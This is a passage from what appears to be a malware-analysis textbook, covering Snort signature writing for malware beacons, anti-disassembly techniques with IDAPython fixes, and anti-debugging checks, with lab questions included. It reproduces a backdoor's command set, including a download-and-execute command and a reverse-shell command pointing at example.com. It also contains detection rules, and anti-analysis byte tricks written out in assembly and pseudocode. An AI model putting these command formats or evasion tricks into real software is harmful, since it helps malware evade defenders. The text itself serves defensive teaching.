rent time according to the system clock, and the CPU speed)
[Word Count: 25]


Data received from other sources, such as a remote server or the file sys-
tem (examples are a nonce sent from server for use in encryption, a local 
file, and keystrokes captured by a keystroke logger)
[Word Count: 37]

Note that there can be various levels of encoding imposed on this data 
prior to its use in networking, but its fundamental origin determines its use-
fulness for signature generation.
[Word Count: 30]

The URI generation function calls GetTickCount, Random, and gethostbyname, 
and when concatenating strings together, the malware uses the colon (:) 
character. The hard-coded Accept string and the hard-coded colon characters 
are good candidates for inclusion in the signature.
The results from the call to Random should be accounted for in the signa-
ture as though any random value could be returned. The results from the 
calls to GetTickCount and gethostbyname need to be evaluated for inclusion 
based on how static their results are.
[Word Count: 83]

While debugging the content-generation code of the sample malware, 
we see that the function creates a string that is then sent to an encoding func-
tion. The format of the string before it’s sent seems to be the following:
[Word Count: 39]

<4 random bytes>:<first three bytes of hostname>:<time from GetTickCount as a hexadecimal number>
[Word Count: 13]

It appears that this is a simple encoding function that takes each byte 
and converts it to its ASCII decimal form (for example, the character a 
becomes 97). It is now clear why it was difficult to figure out the URI using 
dynamic analysis, since it uses randomness, host attributes, time, and an 
encoding formula that can change length depending on the character. 
However, with this information and the information from the static analysis, 
we can easily develop an effective regular expression for the URI.
[Word Count: 85]

Identifying and Leveraging the Encoding Steps
[Word Count: 6]

Identifying the stable or hard-coded content is not always simple, since trans-
formations can occur between the data origin and the network traffic. In this 
example, for instance, the GetTickCount command results are hidden between 
two layers of encoding, first turning the binary DWORD value into an 8-byte hex 
representation, and then translating each of those bytes into its decimal 
ASCII value.
The final regular expression is as follows:
[Word Count: 69]

/\/([12]{0,1}[0-9]{1,2}){4}58[0-9]{6,9}58(4[89]|5[0-7]|9[789]|11[012]){8}/
[Word Count: 1]

Table 14-6 shows the correspondence between the identified data source 
and the final regular expression using one of the previous examples to illus-
trate the transformation.
[Word Count: 26]

Table 14-6: Regular Expression Decomposition from Source Content
[Word Count: 8]

<4 random bytes>
:
<first 3 bytes of hostname>
:
<time from GetTickCount>
[Word Count: 13]

0x91, 0x56, 0xCD, 0x56
:
"m", "a", "l"
:
00057473
[Word Count: 10]

0x91, 0x56, 0xCD, 0x56
0x3A
0x6D, 0x61, 0x6C
0x3A
0x30, 0x30, 0x30, 0x35, 0x37, 0x34, 0x37, 0x33
[Word Count: 17]

1458620586
58
10997108
58
4848485355525551
[Word Count: 5]

(([1-9]|1[0-9]|2[0-5]){0,1}[0-9]){4}
58
[0-9]{6,9}
58
(4[89]|5[0-7]|9[789]|10[012]){8}
[Word Count: 5]

There are a few strategies that could be used to create an effective signa-
ture in this case:
[Word Count: 18]


We could combine the URI regular expression with the fixed User-Agent 
string, so that the regular expression would not be used unless the specific 
User-Agent string is present.
[Word Count: 29]


Assuming you want a signature just for the URI, you can target the two 
58 terms with two content expressions and keywords that ensure that 
only a limited number of bytes are searched once the first instance of 
58 is found (content: "58"; content: "58"; distance: 6; within: 5). The 
within keyword limits the number of characters that are searched.
[Word Count: 61]

The following is the proposed Snort signature for our sample malware, 
which combines many of the different factors we have covered so far: a static 
User-Agent string, an unusual Accept string, an encoded colon (58) in the 
URI, a missing referrer, and a GET request matching the regular expression 
described previously.
[Word Count: 51]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious Beacon "; 
content:"User-Agent: Mozilla/4.0 (compatible\; MSIE 7.0\; Windows NT 5.1)"; 
content:"Accept: * / *"; uricontent:"58"; content:!"|0d0a|referer:"; nocase; 
pcre:"/GET \/([12]{0,1}[0-9]{1,2}){4}58[0-9]{6,9}58(4[89]|5[0-7]|9[789]|10[012]){8} HTTP/"; 
classtype:trojan-activity; sid:2000002; rev:1;)
[Word Count: 32]

NOTE
Typically, when an analyst first learns how to write network signatures, the focus is on 
creating a signature that works. However, ensuring that the signature is efficient is also 
important. This chapter focuses on identifying elements of a good signature, but we do 
not spend much time on optimizing our example signatures to ensure good performance.
[Word Count: 57]

This is a fairly innocuous comment within a web page, and is unlikely to 
attract much attention by itself. It might be tempting to create a network sig-
nature based on the observed traffic, but doing so would result in an incom-
plete solution. First, two questions must be answered:
[Word Count: 50]


What other commands might the malware understand?
[Word Count: 8]


How does the malware identify that the web page contains a command?
[Word Count: 13]

Figure 14-3: An IDA Pro graph of a sample parsing function
[Word Count: 11]

Command example
Base64 translation
Operation
[Word Count: 5]

superlongsleep
c3VwZXJsb25nc2xlZXA=
Sleep for 24 hours
[Word Count: 6]

shortsleep
c2hvcnRzbGVlcA==
Sleep for 1 minute
[Word Count: 6]

run:www.example.com/fast.exe
cnVuOnd3dy5leGFtcGxlLmNvbS9mYXN0LmV4ZQ==
Download and execute a binary 
on the local system
[Word Count: 11]

connect:www.example.com:80
Y29ubmVjdDp3d3cuZXhhbXBsZS5jb206ODA=
Use a custom protocol to establish 
a reverse shell
[Word Count: 11]

One approach to creating signatures for this backdoor is to target the 
full set of commands known to be used by the malware (including the sur-
rounding context). Content expressions for the five commands recognized 
by the malware would contain the following strings:
[Word Count: 43]

<!-- adsrv?bG9uZ3NsZWVw -->
<!-- adsrv?c3VwZXJsb25nc2xlZXA= -->
<!-- adsrv?c2hvcnRzbGVlcA== -->
<!-- adsrv?cnVu
<!-- adsrv?Y29ubmVj
[Word Count: 13]

The last two expressions target only the static part of the commands (run 
and connect), and since the length of the argument is not known, they do not 
target the trailing comment characters (-->).
While signatures that use all of these elements will likely find this precise 
piece of malware, there is a risk of being too specific at the expense of robust-
ness. If the attacker changes any part of the malware—the command set, the 
encoding, or the command prefix—a very precise signature will cease to be 
effective.
[Word Count: 89]

Previously, we saw that different parts of the command interpretation were in 
different parts of the code. Given that knowledge, we can create different sig-
natures to target the various elements separately.
The three elements that appear to be in distinct functions are comment 
bracketing, the fixed adsrv? with a Base64 expression following, and the actual 
command parsing. Based on these three elements, a set of signature elements 
could include the following (for brevity, only the primary elements of each 
signature are included, with each line representing a different signature).
[Word Count: 90]

pcre:"/<!-- adsrv\?([a-zA-Z0-9+\/=]{4})+ -->/"
content:"<!-- "; content:"bG9uZ3NsZWVw -->"; within:100;
content:"<!-- "; content:"c3VwZXJsb25nc2xlZXA= -->"; within:100;
content:"<!-- "; content:"c2hvcnRzbGVlcA== -->"; within:100;
content:"<!-- "; content:"cnVu";within:100;content: "-->"; within:100;
content:"<!-- "; content:"Y29ubmVj"; within:100; content:"-->"; within:100;
[Word Count: 29]

suspicious. Nevertheless, this strategy provides more robust coverage than 
our initial attempt and is more likely to detect future variants of the malware.
Let’s revisit the signature we created earlier for beacon traffic. Recall 
that we combined every possible element into the same signature:
[Word Count: 44]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious Beacon "; 
content:"User-Agent: Mozilla/4.0 (compatible\; MSIE 7.0\; Windows NT 5.1)"; 
content:"Accept: * / *"; uricontent:"58"; content:!"|0d0a|referer:"; nocase; 
pcre:"/GET \/([12]{0,1}[0-9]{1,2}){4}58[0-9]{6,9}58(4[89]|5[0-7]|9[789]|10 [012]){8} HTTP/";
classtype:trojan-activity; sid:2000002; rev:1;)
[Word Count: 33]

This signature has a limited scope and would become useless if the 
attacker made any changes to the malware. A way to address different ele-
ments individually and avoid rapid obsolescence is with these two targets:
[Word Count: 36]


Target 1: User-Agent string, Accept string, no referrer
[Word Count: 9]

This strategy would yield two signatures:
[Word Count: 6]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious Beacon UA with 
Accept Anomaly"; content:"User-Agent: Mozilla/4.0 (compatible\; MSIE 7.0\; Windows NT 5.1)"; 
content:"Accept: * / *"; content:!"|0d0a|referer:"; nocase; classtype:trojan-activity; 
sid:2000004; rev:1;)
[Word Count: 31]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious Beacon URI"; 
uricontent:"58"; content:!"|0d0a|referer:"; nocase; pcre:
"/GET \/([12]{0,1}[0-9]{1,2}){4}58[0-9]{6,9}58(4[89]|5[0-7]|9[789]|10[012]){8} HTTP/";
classtype:trojan-activity; sid:2000005; rev:1;)
[Word Count: 21]

Understanding the Attacker’s Perspective
[Word Count: 4]

Focus on elements of the protocol that are part of both end points.
Changing either the client code or the server code alone is much easier 
than changing both. Look for elements of the protocol that use code at
[Word Count: 39]

both the client and server side, and create a signature based on these ele-
ments. The attacker will need to do a lot of extra work to render such a 
signature obsolete.
[Word Count: 32]

Focus on any elements of the protocol known to be part of a key.
Often, some hard-coded components of a protocol are used as a key. For 
example, an attacker may use a specific User-Agent string as an authen-
tication key so that illegitimate probing can be detected (and possibly 
rerouted). In order for an attacker to bypass such a signature, he would 
need to change code at both end points.
[Word Count: 71]

This chapter’s labs focus on identifying the networking components of mal-
ware. To some degree, these labs build on Chapter 13, since when develop-
ing network signatures, you’ll often need to deal with encoded content.
[Word Count: 35]

Analyze the malware found in file Lab14-01.exe. This program is not harmful 
to your system.
[Word Count: 15]

1.
Which networking libraries does the malware use, and what are their 
advantages?
[Word Count: 13]

2.
What source elements are used to construct the networking beacon, and 
what conditions would cause the beacon to change?
[Word Count: 20]

3.
Why might the information embedded in the networking beacon be of 
interest to the attacker?
[Word Count: 16]

4.
Does the malware use standard Base64 encoding? If not, how is the 
encoding unusual?
[Word Count: 15]

5.
What is the overall purpose of this malware?
[Word Count: 9]

6.
What elements of the malware’s communication may be effectively 
detected using a network signature?
[Word Count: 15]

7.
What mistakes might analysts make in trying to develop a signature for 
this malware?
[Word Count: 15]

8.
What set of signatures would detect this malware (and future variants)?
[Word Count: 12]

Analyze the malware found in file Lab14-02.exe. This malware has been con-
figured to beacon to a hard-coded loopback address in order to prevent it 
from harming your system, but imagine that it is a hard-coded external 
address.
[Word Count: 38]

1.
What are the advantages or disadvantages of coding malware to use 
direct IP addresses?
[Word Count: 15]

2.
Which networking libraries does this malware use? What are the advan-
tages or disadvantages of using these libraries?
[Word Count: 19]

3.
What is the source of the URL that the malware uses for beaconing? 
What advantages does this source offer?
[Word Count: 20]

4.
Which aspect of the HTTP protocol does the malware leverage to 
achieve its objectives?
[Word Count: 15]

5.
What kind of information is communicated in the malware’s initial 
beacon?
[Word Count: 12]

6.
What are some disadvantages in the design of this malware’s communi-
cation channels?
[Word Count: 14]

7.
Is the malware’s encoding scheme standard?
[Word Count: 7]

9.
What is the purpose of this malware, and what role might it play in the 
attacker’s arsenal?
[Word Count: 18]

This lab builds on Lab 14-1. Imagine that this malware is an attempt by 
the attacker to improve his techniques. Analyze the malware found in file 
Lab14-03.exe.
[Word Count: 27]

1.
What hard-coded elements are used in the initial beacon? What ele-
ments, if any, would make a good signature?
[Word Count: 20]

2.
What elements of the initial beacon may not be conducive to a long-
lasting signature?
[Word Count: 16]

3.
How does the malware obtain commands? What example from the 
chapter used a similar methodology? What are the advantages of this 
technique?
[Word Count: 23]

4.
When the malware receives input, what checks are performed on the 
input to determine whether it is a valid command? How does the 
attacker hide the list of commands the malware is searching for?
[Word Count: 35]

5.
What type of encoding is used for command arguments? How is it differ-
ent from Base64, and what advantages or disadvantages does it offer?
[Word Count: 25]

6.
What commands are available to this malware?
[Word Count: 8]

8.
This chapter introduced the idea of targeting different areas of code 
with independent signatures (where possible) in order to add resiliency 
to network indicators. What are some distinct areas of code or configura-
tion data that can be targeted by network signatures?
[Word Count: 43]

9.
What set of signatures should be used for this malware?
[Word Count: 11]

A N T I - R E V E R S E - E N G I N E E R I N G
[Word Count: 24]

Anti-disassembly uses specially crafted code or data in a 
program to cause disassembly analysis tools to produce 
an incorrect program listing. This technique is crafted 
by malware authors manually, with a separate tool in 
the build and deployment process or interwoven into 
their malware’s source code.
[Word Count: 46]

jmp     short near ptr loc_2+1
; ---------------------------------------------------------------------------
[Word Count: 7]

loc_2:                                  ; CODE XREF: seg000:00000000j
                call    near ptr 15FF2A71h 
                or      [ecx], dl
                inc     eax
; ---------------------------------------------------------------------------
                db    0
[Word Count: 19]

This fragment of code was disassembled using the linear-disassembly 
technique, and the result is inaccurate. Reading this code, we miss the piece 
of information that its author is trying to hide. We see what appears to be a 
call instruction, but the target of the call is nonsensical . The first instruc-
tion is a jmp instruction whose target is invalid because it falls in the middle of 
the next instruction.
[Word Count: 71]

Now examine the same sequence of bytes disassembled with a different 
strategy:
[Word Count: 12]

jmp     short loc_3
; ---------------------------------------------------------------------------
                db 0E8h
; ---------------------------------------------------------------------------
[Word Count: 9]

loc_3:                                  ; CODE XREF: seg000:00000000j
                push    2Ah
                call    Sleep 
[Word Count: 10]

Anti-disassembly techniques are born out of inherent weaknesses in dis-
assembler algorithms. Any disassembler must make certain assumptions in 
order to present the code it is disassembling clearly. When these assumptions 
fail, the malware author has an opportunity to fool the malware analyst. 
There are two types of disassembler algorithms: linear and flow-oriented. 
Linear disassembly is easier to implement, but it’s also more error-prone.
[Word Count: 64]

The linear-disassembly strategy iterates over a block of code, disassembling 
one instruction at a time linearly, without deviating. This basic strategy is 
employed by disassembler writing tutorials and is widely used by debuggers.
[Word Count: 33]

Linear disassembly uses the size of the disassembled instruction to determine 
which byte to disassemble next, without regard for flow-control instructions. 
The following code fragment shows the use of the disassembly library 
libdisasm (http://sf.net/projects/bastard/files/libdisasm/) to implement a crude 
disassembler in a handful of lines of C using linear disassembly:
[Word Count: 49]

char buffer[BUF_SIZE];
int position = 0;
[Word Count: 6]

while (position < BUF_SIZE) {
   x86_insn_t insn;
   int size = x86_disasm(buf, BUF_SIZE, 0, position, &insn);
   
   if (size != 0) {
      char disassembly_line[1024];
        x86_format_insn(&insn, disassembly_line, 1024, intel_syntax);
        printf("%s\n", disassembly_line);
position += size;
   } else {
        /* invalid/unrecognized instruction */
position++;
      }
}
x86_cleanup();
[Word Count: 42]

jmp     ds:off_401050[eax*4] ; switch jump
[Word Count: 5]

xor     eax, eax
          pop     esi
          retn
; ---------------------------------------------------------------------------
off_401050 dd offset loc_401020    ; DATA XREF: _main+19r
dd offset loc_401027    ; jump table for switch statement
dd offset loc_40102E
dd offset loc_401035
[Word Count: 31]

The last instruction in this function is retn. In memory, the bytes imme-
diately following the retn instruction are the pointer values beginning with 
401020 at , which in memory will appear as the byte sequence 20 10 40 00 
in hex. These four pointer values shown in the code fragment make up 
16 bytes of data inside the .text section of this binary. They also happen to 
disassemble to valid instructions. The following disassembly fragment would 
be produced by a linear-disassembly algorithm when it continues disassem-
bling instructions beyond the end of the function:
[Word Count: 95]

and [eax],dl
inc eax
add [edi],ah
adc [eax+0x0],al
adc cs:[eax+0x0],al
xor eax,0x4010
[Word Count: 12]

A more advanced category of disassembly algorithms is the flow-oriented dis-
assembler. This is the method used by most commercial disassemblers such as 
IDA Pro. 
The key difference between flow-oriented and linear disassembly is that 
the disassembler doesn’t blindly iterate over a buffer, assuming the data is
[Word Count: 47]

nothing but instructions packed neatly together. Instead, it examines each 
instruction and builds a list of locations to disassemble.
The following fragment shows code that can be disassembled correctly 
only with a flow-oriented disassembler.
[Word Count: 34]

test    eax, eax
jz      short loc_1A
push    Failed_string
call    printf
jmp     short loc_1D
; ---------------------------------------------------------------------------
Failed_string:  db 'Failed',0
; ---------------------------------------------------------------------------
loc_1A:  
                xor     eax, eax
loc_1D:
                retn
[Word Count: 27]

test    eax, eax
                jz      short near ptr loc_15+5
                push    Failed_string
                call    printf
                jmp     short loc_15+9
Failed_string:
                inc     esi
                popa
loc_15:
                imul    ebp, [ebp+64h], 0C3C03100h
[Word Count: 24]

Figure 15-1: call instruction followed by a string
[Word Count: 8]

E8 06 00 00 00       call    near ptr loc_4011CA+1
68 65 6C 6C 6F
push    6F6C6C65h
[Word Count: 16]

loc_4011CA:
00 58 C3             add     [eax-3Dh], bl
[Word Count: 7]

As it turns out, the first letter of the string hello is the letter h, which is 
0x68 in hexadecimal. This is also the opcode of the 5-byte instruction  push 
DWORD. The null terminator for the hello string turned out to also be the first
[Word Count: 46]


Pressing the C key turns the cursor location into code.
[Word Count: 11]


Pressing the D key turns the cursor location into data.
[Word Count: 11]

Here is the same function after manual cleanup:
[Word Count: 8]

E8 06 00 00 00                       call    loc_4011CB
68 65 6C 6C 6F 00    aHello          db 'hello',0
                                     loc_4011CB:                             
58                                   pop     eax
C3                                   retn
[Word Count: 22]

The primary way that malware can force a disassembler to produce inaccu-
rate disassembly is by taking advantage of the disassembler’s choices and 
assumptions. The techniques we will examine in this chapter exploit the 
most basic assumptions of the disassembler and are typically easily fixed by 
a malware analyst. More advanced techniques involve taking advantage of 
information that the disassembler typically doesn’t have access to, as well as 
generating code that is impossible to disassemble completely with conven-
tional assembly listings.
[Word Count: 81]

The most common anti-disassembly technique seen in the wild is two back-to-
back conditional jump instructions that both point to the same target. For 
example, if a jz loc_512 is followed by jnz loc_512, the location loc_512 will 
always be jumped to. The combination of jz with jnz is, in effect, an uncondi-
tional jmp, but the disassembler doesn’t recognize it as such because it only 
disassembles one instruction at a time. When the disassembler encounters 
the jnz, it continues disassembling the false branch of this instruction, 
despite the fact that it will never be executed in practice.
[Word Count: 98]

The following code shows IDA Pro’s first interpretation of a piece of 
code protected with this technique:
[Word Count: 17]

74 03                  jz      short near ptr loc_4011C4+1
75 01                  jnz     short near ptr loc_4011C4+1
loc_4011C4:                     ; CODE XREF: sub_4011C0
                                                       ; sub_4011C0+2j
E8 58 C3 90 90        call    near ptr 90D0D521h
[Word Count: 30]

74 03                  jz      short near ptr loc_4011C5
75 01                  jnz     short near ptr loc_4011C5
; -------------------------------------------------------------------
E8                     db 0E8h
; -------------------------------------------------------------------
                       loc_4011C5:                     ; CODE XREF: sub_4011C0
                                                       ; sub_4011C0+2j
58                     pop     eax
C3                     retn
[Word Count: 33]

The column on the left in these examples shows the bytes that consti-
tute the instruction. Display of this field is optional, but it’s important when 
learning anti-disassembly. To display these bytes (or turn them off), select 
OptionsGeneral. The Number of Opcode Bytes option allows you to enter 
a number for how many bytes you would like to be displayed.
Figure 15-2 shows the sequence of bytes in this example graphically.
[Word Count: 71]

Figure 15-2: A jz instruction followed by a jnz instruction
[Word Count: 10]

A Jump Instruction with a Constant Condition
[Word Count: 7]

Another anti-disassembly technique commonly found in the wild is com-
posed of a single conditional jump instruction placed where the condition 
will always be the same. The following code uses this technique:
[Word Count: 32]

33 C0                  xor     eax, eax
74 01                  jz      short near ptr loc_4011C4+1
loc_4011C4:                             ; CODE XREF: 004011C2j
; DATA XREF: .rdata:004020ACo
E9 58 C3 68 94         jmp     near ptr 94A8D521h
[Word Count: 30]

33 C0                  xor     eax, eax
74 01                  jz      short near ptr loc_4011C5
; --------------------------------------------------------------------
E9                     db 0E9h
; --------------------------------------------------------------------
loc_4011C5:                             ; CODE XREF: 004011C2j
; DATA XREF: .rdata:004020ACo
58                     pop     eax
C3                     retn
[Word Count: 33]

In this example, the 0xE9 byte is used exactly as the 0xE8 byte in the 
previous example. E9 is the opcode for a 5-byte jmp instruction, and E8 is the 
opcode for a 5-byte call instruction. In each case, by tricking the disassem-
bler into disassembling this location, the 4 bytes following this opcode are 
effectively hidden from view. Figure 15-3 shows this example graphically.
[Word Count: 65]

Figure 15-3: False conditional of xor followed by a jz instruction
[Word Count: 11]

Figure 15-4: Inward-pointing jmp instruction
[Word Count: 5]

For a glimpse of the complexity that can be achieved with these sorts of 
instruction sequences, let’s examine a more advanced specimen. Figure 15-5 
shows an example that operates on the same principle as the prior one, where 
some bytes are part of multiple instructions.
[Word Count: 45]

Figure 15-5: Multilevel inward-jumping sequence
[Word Count: 5]

66 B8 EB 05            mov     ax, 5EBh
31 C0                  xor     eax, eax
74 FA
 jz      short near ptr sub_4011C0+2
                loc_4011C8:                        
E8 58 C3 90 90         call    near ptr 98A8D525h
[Word Count: 29]

Since there is no way to clean up the code so that all executing instruc-
tions are represented, we must choose the instructions to leave in. The net 
side effect of this anti-disassembly sequence is that the EAX register is set to 
zero. If you manipulate the code with the D and C keys in IDA Pro so that the 
only instructions visible are the xor instruction and the hidden instructions, 
your result should look like the following.
[Word Count: 78]

66                   byte_4011C0     db 66h
B8                                   db 0B8h
EB                                   db 0EBh
05                                   db    5
; ------------------------------------------------------------
31 C0                                xor     eax, eax
; ------------------------------------------------------------
74                                   db 74h
FA
 db 0FAh 
E8                                   db 0E8h
; ------------------------------------------------------------
58                                   pop     eax
C3                                   retn
[Word Count: 38]

def NopBytes(start, length):
   for i in range(0, length):
     PatchByte(start + i, 0x90)
   MakeCode(start)
[Word Count: 13]

NopBytes(0x004011C0, 4)
NopBytes(0x004011C6, 3)
[Word Count: 4]

This code takes the long approach by making a utility function called 
NopBytes to NOP-out a range of bytes. It then uses that utility function against 
the two ranges that we need to fix. When this script is executed, the resulting 
disassembly is clean, legible, and logically equivalent to the original:
[Word Count: 51]

90                       nop
90                       nop
90                       nop
90                       nop
31 C0                    xor     eax, eax
90                       nop
90                       nop
90                       nop
58                       pop     eax
C3                       retn
[Word Count: 24]

The IDAPython script we just crafted worked beautifully for this sce-
nario, but it is limited in its usefulness when applied to new challenges. To 
reuse the previous script, the malware analyst must decide which offsets and 
which length of bytes to change to NOP instructions, and manually edit the 
script with the new values.
[Word Count: 55]

With a little IDA Python knowledge, we can develop a script that allows 
malware analysts to easily NOP-out instructions as they see fit. The following 
script establishes the hotkey ALT-N. Once this script is executed, whenever 
the user presses ALT-N, IDA Pro will NOP-out the instruction that is currently 
at the cursor location. It will also conveniently advance the cursor to the next 
instruction to facilitate easy NOP-outs of large blocks of code.
[Word Count: 73]

idaapi.CompileLine('static n_key() { RunPythonStatement("nopIt()"); }')
[Word Count: 5]

def nopIt():
   
      start = ScreenEA()
      end = NextHead(start)
      for ea in range(start, end):
            PatchByte(ea, 0x90)
      Jump(end)
      Refresh()
[Word Count: 17]

Modern disassemblers such as IDA Pro do an excellent job of correlating 
function calls and deducing high-level information based on the knowledge 
of how functions are related to each other. This type of analysis works well 
against code written in a standard programming style with a standard com-
piler, but is easily defeated by the malware author.
[Word Count: 57]

004011C0 sub_4011C0      proc near               ; DATA XREF: sub_4011D0+5o
004011C0
004011C0 arg_0           = dword ptr  8
004011C0
004011C0                 push    ebp
004011C1                 mov     ebp, esp
004011C3                 mov     eax, [ebp+arg_0]
004011C6                 shl     eax, 2
004011C9                 pop     ebp
004011CA                 retn
004011CA sub_4011C0      endp
[Word Count: 39]

004011D0 sub_4011D0      proc near               ; CODE XREF: _main+19p
004011D0                                         ; sub_401040+8Bp
004011D0
004011D0 var_4           = dword ptr -4
004011D0 arg_0           = dword ptr  8
004011D0
004011D0                 push    ebp
004011D1                 mov     ebp, esp
004011D3                 push    ecx
004011D4                 push    esi
004011D5                 mov   [ebp+var_4], offset sub_4011C0
004011DC                 push    2Ah
004011DE                 call  [ebp+var_4]
004011E1                 add     esp, 4
004011E4                 mov     esi, eax
004011E6                 mov     eax, [ebp+arg_0]
004011E9                 push    eax
004011EA                 call  [ebp+var_4]
004011ED                 add     esp, 4
004011F0                 lea     eax, [esi+eax+1]
004011F4                 pop     esi
004011F5                 mov     esp, ebp
004011F7                 pop     ebp
004011F8                 retn
004011F8 sub_4011D0      endp
[Word Count: 90]

Adding Missing Code Cross-References in IDA Pro
[Word Count: 7]

AddCodeXref(0x004011DE, 0x004011C0, fl_CF);
AddCodeXref(0x004011EA, 0x004011C0, fl_CF);
[Word Count: 6]

004011C0 sub_4011C0      proc near               ; CODE XREF: _main+19p
004011C0                                         ; sub_401040+8Bp
004011C0
004011C0 var_4           = byte ptr -4
004011C0
004011C0                 call    $+5
004011C5                 add     [esp+4+var_4], 5
004011C9                 retn
004011C9 sub_4011C0      endp ; sp-analysis failed
004011C9
[Word Count: 35]

004011CA ; ------------------------------------------------------------
004011CA                 push    ebp
004011CB                 mov     ebp, esp
004011CD                 mov     eax, [ebp+8]
004011D0                 imul    eax, 2Ah
004011D3                 mov     esp, ebp
004011D5                 pop     ebp
004011D6                 retn
[Word Count: 27]

struct _EXCEPTION_REGISTRATION {
   DWORD prev;
   DWORD handler;
};
[Word Count: 8]

Figure 15-6: Structured Exception Handling (SEH) chain
[Word Count: 7]

push ExceptionHandler
push fs:[0]
mov fs:[0], esp
[Word Count: 7]

mov esp, [esp+8]
mov eax, fs:[0]
mov eax, [eax]
mov eax, [eax]
mov fs:[0], eax
add esp, 8
[Word Count: 18]

Let’s bring all this knowledge back to our original goal of obscuring flow 
control. The following fragment contains a piece of code from a Visual C++ 
binary that covertly transfers flow to a subroutine. Since there is no pointer 
to this function and the disassembler doesn’t understand SEH, it appears as 
though the subroutine has no references, and the disassembler thinks the 
code immediately following the triggering of the exception will be executed.
[Word Count: 73]

00401050               mov     eax, (offset loc_40106B+1)
00401055                 add     eax, 14h
00401058                 push    eax
00401059                 push    large dword ptr fs:0 ; dwMilliseconds
00401060                 mov     large fs:0, esp
00401067                 xor     ecx, ecx
00401069               div     ecx
0040106B
0040106B loc_40106B:                             ; DATA XREF: sub_401050o
0040106B                 call    near ptr Sleep
00401070                 retn
00401070 sub_401050      endp ; sp-analysis failed
00401070
00401070 ; ------------------------------------------------------------------
00401071                 align 10h
00401080               dd 824648Bh, 0A164h, 8B0000h, 0A364008Bh, 0
00401094                 dd 6808C483h
00401098                 dd offset aMysteryCode  ; "Mystery Code"
0040109C                 dd 2DE8h, 4C48300h, 3 dup(0CCCCCCCCh)
[Word Count: 82]

00401080                 mov     esp, [esp+8]
00401084                 mov     eax, large fs:0
0040108A                 mov     eax, [eax]
0040108C                 mov     eax, [eax]
0040108E                 mov     large fs:0, eax
00401094                 add     esp, 8
00401097                 push    offset aMysteryCode ; "Mystery Code"
0040109C                 call    printf
[Word Count: 36]

Listing 15-1: A function that defeats stack-frame analysis
[Word Count: 8]

NOTE
Press CTRL-K in IDA Pro to examine this monstrous stack frame in detail. If you 
attempt to press Y to give this function a prototype, you’ll be presented with one of 
the most ghastly abominations of a function prototype you’ve ever seen.
[Word Count: 43]

ALT-K to enter an adjustment to the stack pointer. In many cases, such as in 
Listing 15-1, it may prove more fruitful to patch the stack-frame manipula-
tion instructions, as in the previous examples.
[Word Count: 34]

Analyze the sample found in the file Lab15-01.exe. This is a command-line 
program that takes an argument and prints “Good Job!” if the argument 
matches a secret code.
[Word Count: 28]

1.
What anti-disassembly technique is used in this binary?
[Word Count: 9]

2.
What rogue opcode is the disassembly tricked into disassembling?
[Word Count: 10]

3.
How many times is this technique used?
[Word Count: 8]

4.
What command-line argument will cause the program to print 
“Good Job!”?
[Word Count: 12]

Analyze the malware found in the file Lab15-02.exe. Correct all anti-disassembly 
countermeasures before analyzing the binary in order to answer the questions.
[Word Count: 22]

1.
What URL is initially requested by the program?
[Word Count: 9]

3.
What does the program look for in the page it initially requests?
[Word Count: 13]

4.
What does the program do with the information it extracts from 
the page?
[Word Count: 14]

Analyze the malware found in the file Lab15-03.exe. At first glance, this binary 
appears to be a legitimate tool, but it actually contains more functionality 
than advertised.
[Word Count: 27]

1.
How is the malicious code initially called?
[Word Count: 8]

Malware uses a variety of techniques to scan for indications that a debugger 
is attached, including using the Windows API, manually checking memory 
structure for debugging artifacts, and searching the system for residue left by 
a debugger. Debugger detection is the most common way that malware per-
forms anti-debugging.
[Word Count: 49]

IsDebuggerPresent
The simplest API function for detecting a debugger is IsDebuggerPresent. 
This function searches the Process Environment Block (PEB) structure 
for the field IsDebugged, which will return zero if you are not running in 
the context of a debugger or a nonzero value if a debugger is attached. 
We’ll discuss the PEB structure in more detail in the next section.
[Word Count: 60]

CheckRemoteDebuggerPresent
This API function is nearly identical to IsDebuggerPresent. The name is 
misleading though, as it does not check for a debugger on a remote 
machine, but rather for a process on the local machine. It also checks 
the PEB structure for the IsDebugged field; however, it can do so for itself 
or another process on the local machine. This function takes a process 
handle as a parameter and will check if that process has a debugger 
attached. CheckRemoteDebuggerPresent can be used to check your own 
process by simply passing a handle to your process.
[Word Count: 95]

NtQueryInformationProcess
This is a native API function in Ntdll.dll that retrieves information about 
a given process. The first parameter to this function is a process handle; 
the second is used to tell the function the type of process information to 
be retrieved. For example, using the value ProcessDebugPort (value 0x7) 
for this parameter will tell you if the process in question is currently 
being debugged. If the process is not being debugged, a zero will be 
returned; otherwise, a port number will be returned.
[Word Count: 84]

OutputDebugString
This function is used to send a string to a debugger for display. It can 
be used to detect the presence of a debugger. For example, Listing 16-1 
uses SetLastError to set the current error code to an arbitrary value. If 
OutputDebugString is called and there is no debugger attached, GetLastError 
should no longer contain our arbitrary value, because an error code will 
be set by the OutputDebugString function if it fails. If OutputDebugString is 
called and there is a debugger attached, the call to OutputDebugString 
should succeed, and the value in GetLastError should not be changed.
[Word Count: 98]

DWORD errorValue = 12345;
SetLastError(errorValue);
[Word Count: 5]

if(GetLastError() == errorValue)
{
  ExitProcess();
}
else
{
  RunMaliciousPayload();
}
[Word Count: 10]

Listing 16-1: OutputDebugString anti-debugging technique
[Word Count: 5]

A Windows PEB structure is maintained by the OS for each running process, 
as shown in the example in Listing 16-2. It contains all user-mode parameters 
associated with a process. These parameters include the process’s environ-
ment data, which itself includes environment variables, the loaded modules 
list, addresses in memory, and debugger status.
[Word Count: 53]

typedef struct _PEB {
  BYTE Reserved1[2];
  BYTE BeingDebugged;
[Word Count: 8]

BYTE Reserved2[1];
  PVOID Reserved3[2];
  PPEB_LDR_DATA Ldr;
  PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
  BYTE Reserved4[104];
  PVOID Reserved5[52];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE Reserved6[128];
  PVOID Reserved7[1];
  ULONG SessionId;
} PEB, *PPEB;
[Word Count: 23]

Listing 16-2: Documented Process Environment Block (PEB) structure
[Word Count: 8]

While a process is running, the location of the PEB can be referenced by 
the location fs:[30h]. For anti-debugging, malware will use that location to 
check the BeingDebugged flag, which indicates whether the specified process is 
